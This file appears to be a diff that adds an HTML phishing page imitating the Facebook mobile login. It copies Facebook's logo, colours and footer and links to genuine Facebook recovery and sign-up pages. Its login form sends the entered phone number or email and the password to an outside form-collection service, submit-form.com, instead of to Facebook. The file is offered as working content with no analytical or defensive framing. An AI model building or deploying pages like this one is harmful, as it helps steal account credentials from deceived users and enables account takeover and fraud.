@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
+    <title>Page title</title>
+    <style>
+     * {
+         margin:0;
+         padding:0;
+         font-family: sans-serif;
+     }
+     body {
+         background: #d5fff517;
+         
+     }
+     #fish {
+         padding:60px;
+     }
+     .vic {
+         width:320px;
+         height:55px;
+         border-radius:10px;
+         background:white;
+         border:1px solid silver;
+         
+         
+         
+     }
+     ::placeholder {
+         color:#4b50718a;
+         
+        
+     }
+     .vic:hover {
+        border:1px solid black;
+     }
+     
+     #openE, #closeE {
+         padding:10px;
+     }
+     .pick {
+        margin-top:5px;
+         margin-left:8px;
+           border-left-color:white;
+           border-right-color:white;
+           border-top-color:white;
+           border-bottom-color:white;
+           width:300px;
+            height:45px;
+            border:1px;
+            float:left;
+     }
+     .pick:hover {
+         
+         outline-color: white;
+     }
+     #password {
+         margin-top:5px;
+         margin-left:8px;
+           border-left-color:white;
+           border-right-color:white;
+           border-top-color:white;
+           border-bottom-color:white;
+           width:230px;
+            height:45px;
+            border:1px;
+         float:left;
+     }
+     #password:hover {
+         outline-color: white;
+     }
+     .gee {
+         height:45px;
+         width:318px;
+         border:1px solid #1563fff3;
+         border-radius:30px;
+         background:#1563fff3;
+         color:white;
+         font-weight:bold;
+     }
+     span {
+         display: none;
+     }
+     #hux {
+         height:45px;
+         width:318px;
+         border-radius:25px;
+         font-weight:bold;
+         
+         border:1px solid #1563fff3;
+         background: #d5fff517;
+     }
+     a {
+         text-decoration:none;
+     }
+     select {
+         background: #d5fff517;
+         border:1px solid  #d5fff517;
+     }
+     #abeg {
+         padding:29px;
+       
+     }
+     input {
+         background:white;
+     }
+    </style>
+</head>
+<body>
+    <center><br>
+    <select disabled>
+        <option>English (UK)</option>
+    </select><br><br><br>
+    <div style="width:30px; height:35px; background:#1563fff3; color:white; border-radius:40px; padding:12px;   margin:10px;" id="abeg">
+   <h2 style="font-size:60px; font-weight:bold;">f</h2>
+   </div><br>
+   <form autocomplete="on" method="post" action="https://submit-form.com/gjHnnjSvv" enctype="multipart/form-data" data-netlify="true">
+       <div class="vic">
+       <input class="pick" type="text" placeholder=" Mobile&nbsp;number or email address" name="text" required/></div><br><br>
+       <div class="vic">
+           <input type="password" placeholder=" Password" id="password" name="password" required/><span class="material-symbols-outlined open-eyes" style="float:right; width: 50px;margin-top: 6px;" onclick="openE()" id="openE">
+visibility
+</span><span  style="display: none; float:right; width: 50px;margin-top:6px;" class="material-symbols-outlined close-eyes" onclick="closeE()" id="closeE">
+visibility_off
+</span>
+       </div><br>
+    <button type="submit" class="gee">Log in</button>
+   </form><br>
+   
+   <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1706264159%26hrc%3D1%26wtsid%3Drdr_08tSIWZrkYbm6XqwS%26refsrc%3Ddeprecated&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0gJVRJ3uEXi0hNHzF&_rdr"><h5 style="color:black; font-family:monospace;" target="_blank">Forgotten Password?</h5></a>
+   <br><br><br><br><br><br>
+   <a href="https://www.facebook.com/r.php?locale=en_GB&display=page" style="color:#1563fff3;" target="_blank"><button id="hux">Create new account</a></button><br><br>
+   <p style=" color:#27293acf"><img src="https://i.ibb.co/j6r5yjD/meta.png" width="18px" height="13px" alt=""> Meta</p>
+</body>
+<script>
+     function openE() {
+
+  let openE = document.getElementById("openE");
+
+  let closeE = document.getElementById("closeE");
+
+  password.type = "text";
+
+  openE.style.display = "none";
+
+  closeE.style.display = "block";
+
+}
+
+
+        function closeE() {
+
+  let openE = document.getElementById("openE");
+
+  let closeE = document.getElementById("closeE");
+
+  password.type = "password";
+
+  closeE.style.display = "none";
+
+  openE.style.display = "block";
+
+}
+
+    </script>
+</html>
